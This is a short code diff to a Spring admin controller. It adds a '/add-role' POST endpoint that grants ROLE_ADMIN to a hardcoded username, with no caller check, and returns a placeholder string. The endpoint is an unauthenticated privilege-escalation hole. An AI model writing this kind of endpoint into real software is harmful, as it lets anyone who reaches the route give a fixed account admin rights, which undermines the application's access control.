@@ -13,6 +13,8 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
+import org.springframework.security.core.Authentication;
+import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.web.bind.annotation.DeleteMapping;
@@ -110,6 +112,16 @@ public class AdminController {
 		
 		return new ResponseEntity<Role>(roleRepository.getOne(USER_ROLE), HttpStatus.OK);
 		
+	}
+	
+	@PostMapping(value="/add-role")
+	public ResponseEntity<?> AddRole(){
+		Role r = roleRepository.findByName("ROLE_ADMIN");
+		Student loggedStudent = studentRepository.getByUsername("adapic");
+		loggedStudent.getRoles().add(r);
+		studentRepository.save(loggedStudent);
+		
+		return new ResponseEntity<String>("alooo", HttpStatus.OK);
 	}
 	
 	
